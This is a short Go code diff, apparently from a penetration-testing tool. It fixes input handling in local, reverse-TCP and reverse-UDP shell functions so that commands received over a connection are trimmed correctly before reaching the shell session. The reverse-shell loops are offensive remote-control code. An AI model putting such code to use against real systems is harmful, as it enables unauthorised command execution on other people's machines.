@@ -40,7 +40,8 @@ func LocalShell(filepath string) {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\n")
+		string_msg := strings.TrimRight(string(msg), "\r\n")
+		session.send(string_msg)
 	}
 }
 
@@ -86,13 +87,15 @@ func ReverseTCPShell(filepath string, host string, port int) {
 	for running == true {
 		//get input
 		msg := make([]byte, 500)
-		target_conn.Read(msg)
+		r,_ := target_conn.Read(msg)
 		if strings.HasPrefix(string(msg), "exit") {
 			running = false
 		}
 		//now send the command
-		string_msg := strings.TrimRight(string(msg), "\r\n")
-		session.send(string_msg + "\r\n")
+		string_msg := fmt.Sprintf("%s", msg[0:r])
+		string_msg = strings.TrimRight(string_msg, "\r\n")
+		string_msg += "\n"
+		session.send(string_msg)
 	}
 }
 
@@ -139,13 +142,15 @@ func ReverseUDPShell(filepath string, host string, port int) {
 	for running == true {
 		//get input
 		msg := make([]byte, 500)
-		target_conn.Read(msg)
+		r,_ := target_conn.Read(msg)
 		if strings.HasPrefix(string(msg), "exit") {
 			running = false
 		}
 		//now send the command
-		string_msg := strings.TrimRight(string(msg), "\r\n")
-		session.send(string_msg + "\r\n")
+		string_msg := fmt.Sprintf("%s", msg[0:r])
+		string_msg = strings.TrimRight(string_msg, "\r\n")
+		string_msg += "\n"
+		session.send(string_msg)
 	}
 }
 
